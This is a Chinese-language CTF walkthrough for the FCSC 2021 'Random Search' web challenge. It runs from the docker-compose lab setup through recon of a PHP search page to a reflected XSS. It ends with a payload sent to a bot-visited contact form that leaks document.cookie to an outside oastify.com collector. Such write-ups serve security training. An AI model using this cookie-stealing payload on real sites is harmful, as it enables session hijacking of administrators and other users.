```yaml
services:
  random-search-web:
    image: anssi/fcsc2021-web-random-search-web:latest
    ports:
      - "8000:8000"
    environment:
      - BOT_REPORT_URL=http://random-search-bot/report

  random-search-bot:
    image: anssi/fcsc2021-web-random-search-bot:latest
    environment:
      - HOST_WEB=random-search-web

```

> 注意，此处 web 应用程序容器在内部映射 8000，发送到 bot 的 URL 需添加端口。而之前的一个挑战配置为 `8000:80` 于是仅需发送域名

## 侦察

访问首页 
- 请求
    ```http
    GET / HTTP/1.1
    Host: 127.0.0.1:8000
    ```
- 响应
    ```http
    HTTP/1.1 200 OK
    Server: Apache/2.4.54 (Debian)
    X-Powered-By: PHP/7.4.33
    ```
    ```html
    <a class="navbar-brand" href="index.php">
        Random Search
    </a>

    <a class="nav-link" href="contact.php">
        Contact
    </a>

    ...

    <form class="form-inline mt-2 mt-md-0" action="index.php">
        <input class="form-control mr-sm-2" type="text" placeholder="" name="search" aria-label="Search">
        <button class="btn btn-outline-success my-2 my-sm-0" type="submit">
            Rechercher
        </button>
    </form>
    ```
    - 功能端点
        - `index.php` GET
            - 参数 `search`
        - `contact.php`

使用搜索功能
- 请求
    ```http
    GET /index.php?search=fooooooo HTTP/1.1
    Host: 127.0.0.1:8000
    ```
    - 响应
        ```html
        <h1>
            Recherche : fooooooo
        </h1>
        ```
        - 存在反射
        - [ ] 测试 XSS

- 测试 XSS 载荷
    ```http
    GET /index.php?search=<@urlencode><img src onerror='print()'></@urlencode> HTTP/1.1
    ```
    - 响应
        ```html
        <h1>
        Recherche : <img src onerror='print()'>
        </h1>
        ```
        - 输入作为元字符

- 测试过程中发现 `<h1>` 标签后的 `<p>` 文本段每次返回不同的非语言随机内容

访问端点 `contact.php`
- 响应
    ```html
    <form class="form-inline" action="contact.php" method="post">
        <div class="input-group">
            <input type="text" style="min-width:700px" class="form-control" placeholder="URL" aria-label="URL" name="url" aria-describedby="basic-addon2">
            <div class="input-group-append">
                <button class="btn btn-outline-secondary" name="submit" type="submit">
                    Envoyer
                </button>
            </div>
        </div>
    </form>
    ```
    - 功能
        - 本端点 POST，的技术支持。bot 模拟打开 url 的管理员
            - 参数 `url`


构造载荷并提交
- 载荷请求
    ```http
    POST /contact.php HTTP/1.1
    Host: 127.0.0.1:8000

    url=http://127.0.0.1:8000/index.php?search=<@urlencode><img src=x onerror="new Image().src = 'http://id.oastify.com/data?' + document.cookie"></@urlencode>&submit=
    ```
